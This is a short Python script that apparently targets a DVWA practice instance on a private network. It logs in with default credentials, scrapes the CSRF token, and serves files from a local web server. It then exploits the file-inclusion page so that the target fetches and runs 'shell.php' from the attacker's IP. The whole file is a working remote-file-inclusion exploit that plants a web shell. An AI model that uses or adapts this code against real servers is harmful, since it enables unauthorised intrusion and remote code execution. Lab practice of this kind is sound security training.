import requests
from bs4 import BeautifulSoup as soupy
import re
import os
import http.server
import threading

web_dir = os.getcwd()
web_port = 80
ip = '192.168.20.62'

proxies = {
    "http": "http://localhost:8080"
}

r = requests.get("http://192.168.20.147/login.php")

soup = soupy(r.text, features='html.parser')
a = soup.find_all('input')[3]
user_token = re.findall(r'value="(.*)">', str(a))[0]

cookies = r.cookies

r = requests.post('http://192.168.20.147/login.php', data={'username': 'admin',
                                                           'password': 'password',
                                                           'Login': 'Login',
                                                           'user_token': user_token},
                  proxies=proxies,
                  cookies=cookies
                  )


def start_server():
    os.chdir(web_dir)
    server_address = ('0.0.0.0', web_port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()


print(f"[*] Starting webserver in {web_dir} thread on port {web_port}")
thread = threading.Thread(target=start_server, daemon=True)
thread.start()

url = 'http://192.168.20.147/vulnerabilities/fi/?page='

filename = 'shell.php'
payload = 'http://' + ip + "/" + filename

print(payload)

r = requests.get(url + payload, proxies=proxies, cookies=cookies)
